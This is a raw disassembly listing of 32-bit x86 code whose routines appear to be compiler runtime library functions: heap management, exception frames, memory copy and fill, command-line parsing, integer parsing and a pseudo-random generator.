  40236f:	29 05 6c c4 40 00    	sub    %eax,0x40c46c
  402375:	8b f7                	mov    %edi,%esi
  402377:	e9 33 01 00 00       	jmp    0x4024af
  40237c:	8b d8                	mov    %eax,%ebx
  40237e:	f6 03 02             	testb  $0x2,(%ebx)
  402381:	75 0d                	jne    0x402390
  402383:	8b c3                	mov    %ebx,%eax
  402385:	8b 50 08             	mov    0x8(%eax),%edx
  402388:	01 14 24             	add    %edx,(%esp)
  40238b:	e8 30 f7 ff ff       	call   0x401ac0
  402390:	83 3c 24 0c          	cmpl   $0xc,(%esp)
  402394:	7c 1b                	jl     0x4023b1
  402396:	8b dd                	mov    %ebp,%ebx
  402398:	03 de                	add    %esi,%ebx
  40239a:	8b 04 24             	mov    (%esp),%eax
  40239d:	83 c8 02             	or     $0x2,%eax
  4023a0:	89 03                	mov    %eax,(%ebx)
  4023a2:	8b c3                	mov    %ebx,%eax
  4023a4:	83 c0 04             	add    $0x4,%eax
  4023a7:	e8 c8 f7 ff ff       	call   0x401b74
  4023ac:	e9 fe 00 00 00       	jmp    0x4024af
  4023b1:	8b f7                	mov    %edi,%esi
  4023b3:	e9 f7 00 00 00       	jmp    0x4024af
  4023b8:	8b c6                	mov    %esi,%eax
  4023ba:	2b c7                	sub    %edi,%eax
  4023bc:	89 44 24 04          	mov    %eax,0x4(%esp)
  4023c0:	3b 1d 70 c4 40 00    	cmp    0x40c470,%ebx
  4023c6:	75 67                	jne    0x40242f
  4023c8:	a1 6c c4 40 00       	mov    0x40c46c,%eax
  4023cd:	3b 44 24 04          	cmp    0x4(%esp),%eax
  4023d1:	7c 53                	jl     0x402426
  4023d3:	8b 44 24 04          	mov    0x4(%esp),%eax
  4023d7:	29 05 6c c4 40 00    	sub    %eax,0x40c46c
  4023dd:	8b 44 24 04          	mov    0x4(%esp),%eax
  4023e1:	01 05 70 c4 40 00    	add    %eax,0x40c470
  4023e7:	83 3d 6c c4 40 00 0c 	cmpl   $0xc,0x40c46c
  4023ee:	7d 18                	jge    0x402408
  4023f0:	a1 6c c4 40 00       	mov    0x40c46c,%eax
  4023f5:	01 05 70 c4 40 00    	add    %eax,0x40c470
  4023fb:	03 35 6c c4 40 00    	add    0x40c46c,%esi
  402401:	33 c0                	xor    %eax,%eax
  402403:	a3 6c c4 40 00       	mov    %eax,0x40c46c
  402408:	8b c6                	mov    %esi,%eax
  40240a:	2b c7                	sub    %edi,%eax
  40240c:	01 05 00 c4 40 00    	add    %eax,0x40c400
  402412:	8b 45 00             	mov    0x0(%ebp),%eax
  402415:	25 03 00 00 80       	and    $0x80000003,%eax
  40241a:	0b f0                	or     %eax,%esi
  40241c:	89 75 00             	mov    %esi,0x0(%ebp)
  40241f:	b0 01                	mov    $0x1,%al
  402421:	e9 a2 00 00 00       	jmp    0x4024c8
  402426:	e8 55 f9 ff ff       	call   0x401d80
  40242b:	8b dd                	mov    %ebp,%ebx
  40242d:	03 df                	add    %edi,%ebx
  40242f:	f6 03 02             	testb  $0x2,(%ebx)
  402432:	75 4d                	jne    0x402481
  402434:	8b d3                	mov    %ebx,%edx
  402436:	8b c2                	mov    %edx,%eax
  402438:	8b 48 08             	mov    0x8(%eax),%ecx
  40243b:	89 0c 24             	mov    %ecx,(%esp)
  40243e:	8b 0c 24             	mov    (%esp),%ecx
  402441:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  402445:	73 0e                	jae    0x402455
  402447:	03 14 24             	add    (%esp),%edx
  40244a:	8b da                	mov    %edx,%ebx
  40244c:	8b 04 24             	mov    (%esp),%eax
  40244f:	29 44 24 04          	sub    %eax,0x4(%esp)
  402453:	eb 2c                	jmp    0x402481
  402455:	e8 66 f6 ff ff       	call   0x401ac0
  40245a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40245e:	29 04 24             	sub    %eax,(%esp)
  402461:	83 3c 24 0c          	cmpl   $0xc,(%esp)
  402465:	7c 0e                	jl     0x402475
  402467:	8b c5                	mov    %ebp,%eax
  402469:	03 c6                	add    %esi,%eax
  40246b:	8b 14 24             	mov    (%esp),%edx
  40246e:	e8 8d f8 ff ff       	call   0x401d00
  402473:	eb 3a                	jmp    0x4024af
  402475:	03 34 24             	add    (%esp),%esi
  402478:	8b dd                	mov    %ebp,%ebx
  40247a:	03 de                	add    %esi,%ebx
  40247c:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  40247f:	eb 2e                	jmp    0x4024af
  402481:	8b 03                	mov    (%ebx),%eax
  402483:	a9 00 00 00 80       	test   $0x80000000,%eax
  402488:	74 21                	je     0x4024ab
  40248a:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  40248f:	03 c3                	add    %ebx,%eax
  402491:	8b d8                	mov    %eax,%ebx
  402493:	8b 54 24 04          	mov    0x4(%esp),%edx
  402497:	8b c3                	mov    %ebx,%eax
  402499:	e8 e6 f9 ff ff       	call   0x401e84
  40249e:	84 c0                	test   %al,%al
  4024a0:	74 09                	je     0x4024ab
  4024a2:	8b dd                	mov    %ebp,%ebx
  4024a4:	03 df                	add    %edi,%ebx
  4024a6:	e9 0d ff ff ff       	jmp    0x4023b8
  4024ab:	33 c0                	xor    %eax,%eax
  4024ad:	eb 19                	jmp    0x4024c8
  4024af:	8b c6                	mov    %esi,%eax
  4024b1:	2b c7                	sub    %edi,%eax
  4024b3:	01 05 00 c4 40 00    	add    %eax,0x40c400
  4024b9:	8b 45 00             	mov    0x0(%ebp),%eax
  4024bc:	25 03 00 00 80       	and    $0x80000003,%eax
  4024c1:	0b f0                	or     %eax,%esi
  4024c3:	89 75 00             	mov    %esi,0x0(%ebp)
  4024c6:	b0 01                	mov    $0x1,%al
  4024c8:	59                   	pop    %ecx
  4024c9:	5a                   	pop    %edx
  4024ca:	5d                   	pop    %ebp
  4024cb:	5f                   	pop    %edi
  4024cc:	5e                   	pop    %esi
  4024cd:	5b                   	pop    %ebx
  4024ce:	c3                   	ret
  4024cf:	90                   	nop
  4024d0:	55                   	push   %ebp
  4024d1:	8b ec                	mov    %esp,%ebp
  4024d3:	51                   	push   %ecx
  4024d4:	53                   	push   %ebx
  4024d5:	56                   	push   %esi
  4024d6:	57                   	push   %edi
  4024d7:	8b f2                	mov    %edx,%esi
  4024d9:	8b d8                	mov    %eax,%ebx
  4024db:	80 3d 15 c4 40 00 00 	cmpb   $0x0,0x40c415
  4024e2:	75 13                	jne    0x4024f7
  4024e4:	e8 2f f4 ff ff       	call   0x401918
  4024e9:	84 c0                	test   %al,%al
  4024eb:	75 0a                	jne    0x4024f7
  4024ed:	33 c0                	xor    %eax,%eax
  4024ef:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024f2:	e9 92 00 00 00       	jmp    0x402589
  4024f7:	33 d2                	xor    %edx,%edx
  4024f9:	55                   	push   %ebp
  4024fa:	68 82 25 40 00       	push   $0x402582
  4024ff:	64 ff 32             	push   %fs:(%edx)
  402502:	64 89 22             	mov    %esp,%fs:(%edx)
  402505:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  40250c:	74 0a                	je     0x402518
  40250e:	68 1c c4 40 00       	push   $0x40c41c
  402513:	e8 88 ed ff ff       	call   0x4012a0
  402518:	8b d6                	mov    %esi,%edx
  40251a:	8b c3                	mov    %ebx,%eax
  40251c:	e8 df fd ff ff       	call   0x402300
  402521:	84 c0                	test   %al,%al
  402523:	74 05                	je     0x40252a
  402525:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402528:	eb 37                	jmp    0x402561
  40252a:	8b c6                	mov    %esi,%eax
  40252c:	e8 a3 fa ff ff       	call   0x401fd4
  402531:	8b f8                	mov    %eax,%edi
  402533:	8b c3                	mov    %ebx,%eax
  402535:	83 e8 04             	sub    $0x4,%eax
  402538:	8b 00                	mov    (%eax),%eax
  40253a:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  40253f:	83 e8 04             	sub    $0x4,%eax
  402542:	3b f0                	cmp    %eax,%esi
  402544:	7d 02                	jge    0x402548
  402546:	8b c6                	mov    %esi,%eax
  402548:	85 ff                	test   %edi,%edi
  40254a:	74 12                	je     0x40255e
  40254c:	8b c8                	mov    %eax,%ecx
  40254e:	8b d7                	mov    %edi,%edx
  402550:	8b c3                	mov    %ebx,%eax
  402552:	e8 71 01 00 00       	call   0x4026c8
  402557:	8b c3                	mov    %ebx,%eax
  402559:	e8 fe fb ff ff       	call   0x40215c
  40255e:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402561:	33 c0                	xor    %eax,%eax
  402563:	5a                   	pop    %edx
  402564:	59                   	pop    %ecx
  402565:	59                   	pop    %ecx
  402566:	64 89 10             	mov    %edx,%fs:(%eax)
  402569:	68 89 25 40 00       	push   $0x402589
  40256e:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  402575:	74 0a                	je     0x402581
  402577:	68 1c c4 40 00       	push   $0x40c41c
  40257c:	e8 27 ed ff ff       	call   0x4012a8
  402581:	c3                   	ret
  402582:	e9 d9 07 00 00       	jmp    0x402d60
  402587:	eb e5                	jmp    0x40256e
  402589:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40258c:	5f                   	pop    %edi
  40258d:	5e                   	pop    %esi
  40258e:	5b                   	pop    %ebx
  40258f:	59                   	pop    %ecx
  402590:	5d                   	pop    %ebp
  402591:	c3                   	ret
  402592:	8b c0                	mov    %eax,%eax
  402594:	85 c0                	test   %eax,%eax
  402596:	74 0a                	je     0x4025a2
  402598:	ff 15 04 b0 40 00    	call   *0x40b004
  40259e:	09 c0                	or     %eax,%eax
  4025a0:	74 01                	je     0x4025a3
  4025a2:	c3                   	ret
  4025a3:	b0 01                	mov    $0x1,%al
  4025a5:	e9 6a 00 00 00       	jmp    0x402614
  4025aa:	c3                   	ret
  4025ab:	90                   	nop
  4025ac:	85 c0                	test   %eax,%eax
  4025ae:	74 0a                	je     0x4025ba
  4025b0:	ff 15 08 b0 40 00    	call   *0x40b008
  4025b6:	09 c0                	or     %eax,%eax
  4025b8:	75 01                	jne    0x4025bb
  4025ba:	c3                   	ret
  4025bb:	b0 02                	mov    $0x2,%al
  4025bd:	e9 52 00 00 00       	jmp    0x402614
  4025c2:	c3                   	ret
  4025c3:	90                   	nop
  4025c4:	8b 08                	mov    (%eax),%ecx
  4025c6:	85 c9                	test   %ecx,%ecx
  4025c8:	74 32                	je     0x4025fc
  4025ca:	85 d2                	test   %edx,%edx
  4025cc:	74 18                	je     0x4025e6
  4025ce:	50                   	push   %eax
  4025cf:	89 c8                	mov    %ecx,%eax
  4025d1:	ff 15 0c b0 40 00    	call   *0x40b00c
  4025d7:	59                   	pop    %ecx
  4025d8:	09 c0                	or     %eax,%eax
  4025da:	74 19                	je     0x4025f5
  4025dc:	89 01                	mov    %eax,(%ecx)
  4025de:	c3                   	ret
  4025df:	b0 02                	mov    $0x2,%al
  4025e1:	e9 2e 00 00 00       	jmp    0x402614
  4025e6:	89 10                	mov    %edx,(%eax)
  4025e8:	89 c8                	mov    %ecx,%eax
  4025ea:	ff 15 08 b0 40 00    	call   *0x40b008
  4025f0:	09 c0                	or     %eax,%eax
  4025f2:	75 eb                	jne    0x4025df
  4025f4:	c3                   	ret
  4025f5:	b0 01                	mov    $0x1,%al
  4025f7:	e9 18 00 00 00       	jmp    0x402614
  4025fc:	85 d2                	test   %edx,%edx
  4025fe:	74 10                	je     0x402610
  402600:	50                   	push   %eax
  402601:	89 d0                	mov    %edx,%eax
  402603:	ff 15 04 b0 40 00    	call   *0x40b004
  402609:	59                   	pop    %ecx
  40260a:	09 c0                	or     %eax,%eax
  40260c:	74 e7                	je     0x4025f5
  40260e:	89 01                	mov    %eax,(%ecx)
  402610:	c3                   	ret
  402611:	8d 40 00             	lea    0x0(%eax),%eax
  402614:	83 e0 7f             	and    $0x7f,%eax
  402617:	8b 0d 04 c0 40 00    	mov    0x40c004,%ecx
  40261d:	85 c9                	test   %ecx,%ecx
  40261f:	74 03                	je     0x402624
  402621:	5a                   	pop    %edx
  402622:	ff d1                	call   *%ecx
  402624:	48                   	dec    %eax
  402625:	8a 80 3d 26 40 00    	mov    0x40263d(%eax),%al
  40262b:	79 0b                	jns    0x402638
  40262d:	e8 7a 0a 00 00       	call   0x4030ac
  402632:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  402638:	e9 63 18 00 00       	jmp    0x403ea0
  40263d:	cb                   	lret
  40263e:	cc                   	int3
  40263f:	c8 c9 d7 cf          	enter  $0xd7c9,$0xcf
  402643:	c8 cd ce db          	enter  $0xcecd,$0xdb
  402647:	d8 ca                	fmul   %st(2),%st
  402649:	d9 da                	(bad)
  40264b:	dc dd                	(bad)
  40264d:	de df                	(bad)
  40264f:	e0 e1                	loopne 0x402632
  402651:	c3                   	ret
  402652:	8b c0                	mov    %eax,%eax
  402654:	50                   	push   %eax
  402655:	52                   	push   %edx
  402656:	51                   	push   %ecx
  402657:	e8 50 0a 00 00       	call   0x4030ac
  40265c:	83 b8 04 00 00 00 00 	cmpl   $0x0,0x4(%eax)
  402663:	59                   	pop    %ecx
  402664:	5a                   	pop    %edx
  402665:	58                   	pop    %eax
  402666:	75 01                	jne    0x402669
  402668:	c3                   	ret
  402669:	31 c0                	xor    %eax,%eax
  40266b:	e9 a4 ff ff ff       	jmp    0x402614
  402670:	c3                   	ret
  402671:	8d 40 00             	lea    0x0(%eax),%eax
  402674:	50                   	push   %eax
  402675:	e8 32 0a 00 00       	call   0x4030ac
  40267a:	8f 80 04 00 00 00    	pop    0x4(%eax)
  402680:	c3                   	ret
  402681:	8d 40 00             	lea    0x0(%eax),%eax
  402684:	e8 8f eb ff ff       	call   0x401218
  402689:	e9 e6 ff ff ff       	jmp    0x402674
  40268e:	c3                   	ret
  40268f:	90                   	nop
  402690:	e8 17 0a 00 00       	call   0x4030ac
  402695:	31 d2                	xor    %edx,%edx
  402697:	8b 88 04 00 00 00    	mov    0x4(%eax),%ecx
  40269d:	89 90 04 00 00 00    	mov    %edx,0x4(%eax)
  4026a3:	89 c8                	mov    %ecx,%eax
  4026a5:	c3                   	ret
  4026a6:	8b c0                	mov    %eax,%eax
  4026a8:	53                   	push   %ebx
  4026a9:	8b d8                	mov    %eax,%ebx
  4026ab:	6a 00                	push   $0x0
  4026ad:	8b c3                	mov    %ebx,%eax
  4026af:	e8 f0 0c 00 00       	call   0x4033a4
  4026b4:	50                   	push   %eax
  4026b5:	e8 4e eb ff ff       	call   0x401208
  4026ba:	66 85 c0             	test   %ax,%ax
  4026bd:	75 05                	jne    0x4026c4
  4026bf:	e8 c0 ff ff ff       	call   0x402684
  4026c4:	5b                   	pop    %ebx
  4026c5:	c3                   	ret
  4026c6:	8b c0                	mov    %eax,%eax
  4026c8:	56                   	push   %esi
  4026c9:	57                   	push   %edi
  4026ca:	89 c6                	mov    %eax,%esi
  4026cc:	89 d7                	mov    %edx,%edi
  4026ce:	89 c8                	mov    %ecx,%eax
  4026d0:	39 f7                	cmp    %esi,%edi
  4026d2:	7f 13                	jg     0x4026e7
  4026d4:	74 2f                	je     0x402705
  4026d6:	c1 f9 02             	sar    $0x2,%ecx
  4026d9:	78 2a                	js     0x402705
  4026db:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4026dd:	89 c1                	mov    %eax,%ecx
  4026df:	83 e1 03             	and    $0x3,%ecx
  4026e2:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4026e4:	5f                   	pop    %edi
  4026e5:	5e                   	pop    %esi
  4026e6:	c3                   	ret
  4026e7:	8d 74 0e fc          	lea    -0x4(%esi,%ecx,1),%esi
  4026eb:	8d 7c 0f fc          	lea    -0x4(%edi,%ecx,1),%edi
  4026ef:	c1 f9 02             	sar    $0x2,%ecx
  4026f2:	78 11                	js     0x402705
  4026f4:	fd                   	std
  4026f5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4026f7:	89 c1                	mov    %eax,%ecx
  4026f9:	83 e1 03             	and    $0x3,%ecx
  4026fc:	83 c6 03             	add    $0x3,%esi
  4026ff:	83 c7 03             	add    $0x3,%edi
  402702:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402704:	fc                   	cld
  402705:	5f                   	pop    %edi
  402706:	5e                   	pop    %esi
  402707:	c3                   	ret
  402708:	53                   	push   %ebx
  402709:	56                   	push   %esi
  40270a:	81 c4 00 ff ff ff    	add    $0xffffff00,%esp
  402710:	8b d8                	mov    %eax,%ebx
  402712:	eb 01                	jmp    0x402715
  402714:	43                   	inc    %ebx
  402715:	8a 03                	mov    (%ebx),%al
  402717:	84 c0                	test   %al,%al
  402719:	74 04                	je     0x40271f
  40271b:	3c 20                	cmp    $0x20,%al
  40271d:	76 f5                	jbe    0x402714
  40271f:	80 3b 22             	cmpb   $0x22,(%ebx)
  402722:	75 0b                	jne    0x40272f
  402724:	80 7b 01 22          	cmpb   $0x22,0x1(%ebx)
  402728:	75 05                	jne    0x40272f
  40272a:	83 c3 02             	add    $0x2,%ebx
  40272d:	eb e6                	jmp    0x402715
  40272f:	33 f6                	xor    %esi,%esi
  402731:	eb 23                	jmp    0x402756
  402733:	3c 22                	cmp    $0x22,%al
  402735:	75 1a                	jne    0x402751
  402737:	43                   	inc    %ebx
  402738:	eb 05                	jmp    0x40273f
  40273a:	88 04 34             	mov    %al,(%esp,%esi,1)
  40273d:	46                   	inc    %esi
  40273e:	43                   	inc    %ebx
  40273f:	8a 03                	mov    (%ebx),%al
  402741:	84 c0                	test   %al,%al
  402743:	74 04                	je     0x402749
  402745:	3c 22                	cmp    $0x22,%al
  402747:	75 f1                	jne    0x40273a
  402749:	80 3b 00             	cmpb   $0x0,(%ebx)
  40274c:	74 08                	je     0x402756
  40274e:	43                   	inc    %ebx
  40274f:	eb 05                	jmp    0x402756
  402751:	88 04 34             	mov    %al,(%esp,%esi,1)
  402754:	46                   	inc    %esi
  402755:	43                   	inc    %ebx
  402756:	8a 03                	mov    (%ebx),%al
  402758:	3c 20                	cmp    $0x20,%al
  40275a:	77 d7                	ja     0x402733
  40275c:	8b c2                	mov    %edx,%eax
  40275e:	8b d4                	mov    %esp,%edx
  402760:	8b ce                	mov    %esi,%ecx
  402762:	e8 59 0a 00 00       	call   0x4031c0
  402767:	8b c3                	mov    %ebx,%eax
  402769:	81 c4 00 01 00 00    	add    $0x100,%esp
  40276f:	5e                   	pop    %esi
  402770:	5b                   	pop    %ebx
  402771:	c3                   	ret
  402772:	8b c0                	mov    %eax,%eax
  402774:	53                   	push   %ebx
  402775:	56                   	push   %esi
  402776:	57                   	push   %edi
  402777:	81 c4 f8 fe ff ff    	add    $0xfffffef8,%esp
  40277d:	8b f2                	mov    %edx,%esi
  40277f:	8b d8                	mov    %eax,%ebx
  402781:	85 db                	test   %ebx,%ebx
  402783:	75 1e                	jne    0x4027a3
  402785:	68 05 01 00 00       	push   $0x105
  40278a:	8d 44 24 04          	lea    0x4(%esp),%eax
  40278e:	50                   	push   %eax
  40278f:	6a 00                	push   $0x0
  402791:	e8 8a ea ff ff       	call   0x401220
  402796:	8b c8                	mov    %eax,%ecx
  402798:	8b d4                	mov    %esp,%edx
  40279a:	8b c6                	mov    %esi,%eax
  40279c:	e8 1f 0a 00 00       	call   0x4031c0
  4027a1:	eb 1e                	jmp    0x4027c1
  4027a3:	e8 68 ea ff ff       	call   0x401210
  4027a8:	8b f8                	mov    %eax,%edi
  4027aa:	8b d6                	mov    %esi,%edx
  4027ac:	8b c7                	mov    %edi,%eax
  4027ae:	e8 55 ff ff ff       	call   0x402708
  4027b3:	8b f8                	mov    %eax,%edi
  4027b5:	85 db                	test   %ebx,%ebx
  4027b7:	74 08                	je     0x4027c1
  4027b9:	83 3e 00             	cmpl   $0x0,(%esi)
  4027bc:	74 03                	je     0x4027c1
  4027be:	4b                   	dec    %ebx
  4027bf:	eb e9                	jmp    0x4027aa
  4027c1:	81 c4 08 01 00 00    	add    $0x108,%esp
  4027c7:	5f                   	pop    %edi
  4027c8:	5e                   	pop    %esi
  4027c9:	5b                   	pop    %ebx
  4027ca:	c3                   	ret
  4027cb:	90                   	nop
  4027cc:	55                   	push   %ebp
  4027cd:	8b ec                	mov    %esp,%ebp
  4027cf:	83 c4 e8             	add    $0xffffffe8,%esp
  4027d2:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4027d5:	50                   	push   %eax
  4027d6:	e8 dd e9 ff ff       	call   0x4011b8
  4027db:	0f b7 45 f0          	movzwl -0x10(%ebp),%eax
  4027df:	6b c0 3c             	imul   $0x3c,%eax,%eax
  4027e2:	66 03 45 f2          	add    -0xe(%ebp),%ax
  4027e6:	6b c0 3c             	imul   $0x3c,%eax,%eax
  4027e9:	31 d2                	xor    %edx,%edx
  4027eb:	66 8b 55 f4          	mov    -0xc(%ebp),%dx
  4027ef:	01 d0                	add    %edx,%eax
  4027f1:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
  4027f7:	66 8b 55 f6          	mov    -0xa(%ebp),%dx
  4027fb:	01 d0                	add    %edx,%eax
  4027fd:	89 05 2c c0 40 00    	mov    %eax,0x40c02c
  402803:	8b e5                	mov    %ebp,%esp
  402805:	5d                   	pop    %ebp
  402806:	c3                   	ret
  402807:	90                   	nop
  402808:	80 f8 61             	cmp    $0x61,%al
  40280b:	72 08                	jb     0x402815
  40280d:	80 f8 7a             	cmp    $0x7a,%al
  402810:	77 03                	ja     0x402815
  402812:	80 e8 20             	sub    $0x20,%al
  402815:	c3                   	ret
  402816:	8b c0                	mov    %eax,%eax
  402818:	b8 d2 00 00 00       	mov    $0xd2,%eax
  40281d:	e9 7e 16 00 00       	jmp    0x403ea0
  402822:	c3                   	ret
  402823:	90                   	nop
  402824:	57                   	push   %edi
  402825:	89 c7                	mov    %eax,%edi
  402827:	88 cd                	mov    %cl,%ch
  402829:	89 c8                	mov    %ecx,%eax
  40282b:	c1 e0 10             	shl    $0x10,%eax
  40282e:	66 89 c8             	mov    %cx,%ax
  402831:	89 d1                	mov    %edx,%ecx
  402833:	c1 f9 02             	sar    $0x2,%ecx
  402836:	78 09                	js     0x402841
  402838:	f3 ab                	rep stos %eax,%es:(%edi)
  40283a:	89 d1                	mov    %edx,%ecx
  40283c:	83 e1 03             	and    $0x3,%ecx
  40283f:	f3 aa                	rep stos %al,%es:(%edi)
  402841:	5f                   	pop    %edi
  402842:	c3                   	ret
  402843:	90                   	nop
  402844:	69 15 2c c0 40 00 05 	imul   $0x8088405,0x40c02c,%edx
  40284b:	84 08 08 
  40284e:	42                   	inc    %edx
  40284f:	89 15 2c c0 40 00    	mov    %edx,0x40c02c
  402855:	f7 e2                	mul    %edx
  402857:	89 d0                	mov    %edx,%eax
  402859:	c3                   	ret
  40285a:	8b c0                	mov    %eax,%eax
  40285c:	53                   	push   %ebx
  40285d:	56                   	push   %esi
  40285e:	57                   	push   %edi
  40285f:	89 c6                	mov    %eax,%esi
  402861:	50                   	push   %eax
  402862:	85 c0                	test   %eax,%eax
  402864:	74 51                	je     0x4028b7
  402866:	31 c0                	xor    %eax,%eax
  402868:	31 db                	xor    %ebx,%ebx
  40286a:	bf cc cc cc 0c       	mov    $0xccccccc,%edi
  40286f:	8a 1e                	mov    (%esi),%bl
  402871:	46                   	inc    %esi
  402872:	80 fb 20             	cmp    $0x20,%bl
  402875:	74 f8                	je     0x40286f
  402877:	b5 00                	mov    $0x0,%ch
  402879:	80 fb 2d             	cmp    $0x2d,%bl
  40287c:	74 45                	je     0x4028c3
  40287e:	80 fb 2b             	cmp    $0x2b,%bl
  402881:	74 42                	je     0x4028c5
  402883:	80 fb 24             	cmp    $0x24,%bl
  402886:	74 42                	je     0x4028ca
  402888:	84 db                	test   %bl,%bl
  40288a:	74 32                	je     0x4028be
  40288c:	80 eb 30             	sub    $0x30,%bl
  40288f:	80 fb 09             	cmp    $0x9,%bl
  402892:	77 2a                	ja     0x4028be
  402894:	39 f8                	cmp    %edi,%eax
  402896:	77 26                	ja     0x4028be
  402898:	8d 04 80             	lea    (%eax,%eax,4),%eax
  40289b:	01 c0                	add    %eax,%eax
  40289d:	01 d8                	add    %ebx,%eax
  40289f:	8a 1e                	mov    (%esi),%bl
  4028a1:	46                   	inc    %esi
  4028a2:	84 db                	test   %bl,%bl
  4028a4:	75 e6                	jne    0x40288c
  4028a6:	fe cd                	dec    %ch
  4028a8:	74 10                	je     0x4028ba
  4028aa:	85 c0                	test   %eax,%eax
  4028ac:	7c 10                	jl     0x4028be
  4028ae:	59                   	pop    %ecx
  4028af:	31 f6                	xor    %esi,%esi
  4028b1:	89 32                	mov    %esi,(%edx)
  4028b3:	5f                   	pop    %edi
  4028b4:	5e                   	pop    %esi
  4028b5:	5b                   	pop    %ebx
  4028b6:	c3                   	ret
  4028b7:	46                   	inc    %esi
  4028b8:	eb 04                	jmp    0x4028be
  4028ba:	f7 d8                	neg    %eax
  4028bc:	7e f0                	jle    0x4028ae
  4028be:	5b                   	pop    %ebx
  4028bf:	29 de                	sub    %ebx,%esi
  4028c1:	eb ee                	jmp    0x4028b1
  4028c3:	fe c5                	inc    %ch
  4028c5:	8a 1e                	mov    (%esi),%bl
  4028c7:	46                   	inc    %esi
  4028c8:	eb be                	jmp    0x402888
  4028ca:	bf ff ff ff 0f       	mov    $0xfffffff,%edi
  4028cf:	8a 1e                	mov    (%esi),%bl
  4028d1:	46                   	inc    %esi
  4028d2:	84 db                	test   %bl,%bl
  4028d4:	74 e1                	je     0x4028b7
  4028d6:	80 fb 61             	cmp    $0x61,%bl
  4028d9:	72 03                	jb     0x4028de
  4028db:	80 eb 20             	sub    $0x20,%bl
  4028de:	80 eb 30             	sub    $0x30,%bl
  4028e1:	80 fb 09             	cmp    $0x9,%bl
  4028e4:	76 0b                	jbe    0x4028f1
  4028e6:	80 eb 11             	sub    $0x11,%bl
  4028e9:	80 fb 05             	cmp    $0x5,%bl
  4028ec:	77 d0                	ja     0x4028be
  4028ee:	80 c3 0a             	add    $0xa,%bl
  4028f1:	39 f8                	cmp    %edi,%eax
  4028f3:	77 c9                	ja     0x4028be
  4028f5:	c1 e0 04             	shl    $0x4,%eax
  4028f8:	01 d8                	add    %ebx,%eax
  4028fa:	8a 1e                	mov    (%esi),%bl
  4028fc:	46                   	inc    %esi
  4028fd:	84 db                	test   %bl,%bl
  4028ff:	75 d5                	jne    0x4028d6
  402901:	eb ab                	jmp    0x4028ae
  402903:	c3                   	ret
  402904:	db e3                	fninit
  402906:	9b d9 2d 10 b0 40 00 	fldcw  0x40b010
  40290d:	c3                   	ret
  40290e:	8b c0                	mov    %eax,%eax
  402910:	8b 00                	mov    (%eax),%eax
  402912:	c3                   	ret
  402913:	90                   	nop
  402914:	56                   	push   %esi
  402915:	57                   	push   %edi
  402916:	89 d7                	mov    %edx,%edi
  402918:	8b 70 e4             	mov    -0x1c(%eax),%esi
  40291b:	31 c9                	xor    %ecx,%ecx
  40291d:	8a 0e                	mov    (%esi),%cl
  40291f:	41                   	inc    %ecx
  402920:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402922:	5f                   	pop    %edi
  402923:	5e                   	pop    %esi
  402924:	c3                   	ret
  402925:	8d 40 00             	lea    0x0(%eax),%eax
  402928:	53                   	push   %ebx
  402929:	31 db                	xor    %ebx,%ebx
  40292b:	09 d2                	or     %edx,%edx
  40292d:	74 1c                	je     0x40294b
  40292f:	8b 40 e4             	mov    -0x1c(%eax),%eax
  402932:	31 c9                	xor    %ecx,%ecx
  402934:	8a 08                	mov    (%eax),%cl
  402936:	3b 4a fc             	cmp    -0x4(%edx),%ecx
  402939:	75 10                	jne    0x40294b
  40293b:	4a                   	dec    %edx
  40293c:	8a 3c 08             	mov    (%eax,%ecx,1),%bh
  40293f:	32 3c 0a             	xor    (%edx,%ecx,1),%bh
  402942:	80 e7 df             	and    $0xdf,%bh
  402945:	75 04                	jne    0x40294b
  402947:	49                   	dec    %ecx
  402948:	75 f2                	jne    0x40293c
  40294a:	43                   	inc    %ebx
  40294b:	88 d8                	mov    %bl,%al
  40294d:	5b                   	pop    %ebx
  40294e:	c3                   	ret
  40294f:	90                   	nop
  402950:	8b 40 ec             	mov    -0x14(%eax),%eax
  402953:	c3                   	ret
  402954:	57                   	push   %edi
  402955:	50                   	push   %eax
  402956:	8b 40 e8             	mov    -0x18(%eax),%eax
  402959:	e8 36 fc ff ff       	call   0x402594
  40295e:	89 c7                	mov    %eax,%edi
  402960:	89 c2                	mov    %eax,%edx
  402962:	58                   	pop    %eax
  402963:	ab                   	stos   %eax,%es:(%edi)
  402964:	8b 48 e8             	mov    -0x18(%eax),%ecx
  402967:	31 c0                	xor    %eax,%eax
  402969:	51                   	push   %ecx
  40296a:	c1 e9 02             	shr    $0x2,%ecx
  40296d:	49                   	dec    %ecx
  40296e:	f3 ab                	rep stos %eax,%es:(%edi)
  402970:	59                   	pop    %ecx
  402971:	83 e1 03             	and    $0x3,%ecx
  402974:	f3 aa                	rep stos %al,%es:(%edi)
  402976:	89 d0                	mov    %edx,%eax
  402978:	5f                   	pop    %edi
  402979:	c3                   	ret
  40297a:	8b c0                	mov    %eax,%eax
  40297c:	53                   	push   %ebx
  40297d:	56                   	push   %esi
  40297e:	89 c3                	mov    %eax,%ebx
  402980:	8b 30                	mov    (%eax),%esi
  402982:	8b 56 d0             	mov    -0x30(%esi),%edx
  402985:	8b 76 ec             	mov    -0x14(%esi),%esi
  402988:	85 d2                	test   %edx,%edx
  40298a:	74 07                	je     0x402993
  40298c:	e8 3f 0c 00 00       	call   0x4035d0
  402991:	89 d8                	mov    %ebx,%eax
  402993:	85 f6                	test   %esi,%esi
  402995:	75 eb                	jne    0x402982
  402997:	e8 10 fc ff ff       	call   0x4025ac
  40299c:	5e                   	pop    %esi
  40299d:	5b                   	pop    %ebx
  40299e:	c3                   	ret
